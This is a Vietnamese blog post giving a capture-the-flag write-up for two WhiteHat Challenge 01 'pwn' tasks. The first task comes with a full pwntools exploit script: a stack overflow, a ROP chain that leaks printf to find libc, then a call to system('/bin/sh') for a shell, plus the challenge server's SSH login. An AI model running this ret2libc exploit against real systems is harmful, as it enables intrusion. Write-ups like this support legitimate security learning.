---
layout: post
title: "[WhiteHat Challenge 01] - Pwn"
---



BTC cho 2 bài pwn khá dễ nên điểm cũng thấp :sosad:

### Pwn 001: 

![pwn001](http://i.imgur.com/r5x7w2Y.png)

Đây chỉ là bài bof cơ bản (như cái tên bài). 

Kiểm tra file  trước ...

![checkpwn1](http://i.imgur.com/Qmk7AGd.png)

Bật NX này nọ. Elf 64-bit nữa. 

Vào gdb debug. Tính toán khoảng cách để control eip với tính offset mấy cái hàm ...

Gồm 2 stage. Ban đầu leak địa chỉ printf để tính libc base, sau đó quay về main và đưa payload call system("/bin/sh") vào.

Code :

```python
from pwn import *

# find rop gadget
pop_rdi=0x0000000000400623

printf=0x0000000000400450
printf_got=0x0000000000601018
mainn=0x40057d

#compute offset (ssh)
off_printf=0x0000000000054340 
off_system=0x0000000000046590 
str_binsh=0x000000000017C8C3

def main(args):
	if len(args)<2:
		r=remote("127.0.0.1",9999)
	else:
		s=ssh(host="103.237.99.35",user="pwn001",password="Pwn001")
		r=s.process("./SimpleBoF")
	
	#leak libc

	pl="A"*40 

	pl+=p64(pop_rdi)
	pl+=p64(printf_got)
	pl+=p64(printf)

	pl+=p64(mainn) # return main after leak printf
	raw_input("?")
	r.sendline(pl)

	leak=r.recv(1024)

	print leak.encode('hex')

	libc_printf=u64(leak[len(leak)-8:len(leak)])
	libc_printf>>=16

	log.info("Leak printf: " + hex(libc_printf))

	libcbase=libc_printf-off_printf
	system=libcbase+off_system
	binsh=libcbase+str_binsh

	log.info("system: " + hex(system))
	log.info("binsh: " + hex(binsh))

	#exploit !
	pl="A"*40
	pl+=p64(pop_rdi)
	pl+=p64(binsh)
	pl+=p64(system)
	r.sendline(pl)

	r.interactive()

if __name__=="__main__":
	main(sys.argv)
	sys.exit(0)

```



![donepwn1](http://i.imgur.com/A6SidH2.png)



### Pwn002 

![pwn002](http://i.imgur.com/xQe7G11.png)

Cũng là bof mà ez hơn.

Kiểm tra file rồi quăng vào IDA. Để ctrinh strcpy argv của mình thì vào hàm check_argv.

![check_argv](http://i.imgur.com/Prq9xgx.png)

Nếu độ dài bằng 17 thì return 1 => cho phép copy. Và cũng vừa đủ để chạy hàm tiếp theo.

Ngoài ra ta còn thấy có sẵn hàm system. Xem thử thì thấy có func này ...

![stors](http://i.imgur.com/QMiF31k.png)

Rồi. pwn thôi.

![donepwn2](http://i.imgur.com/qjZWT4z.png)

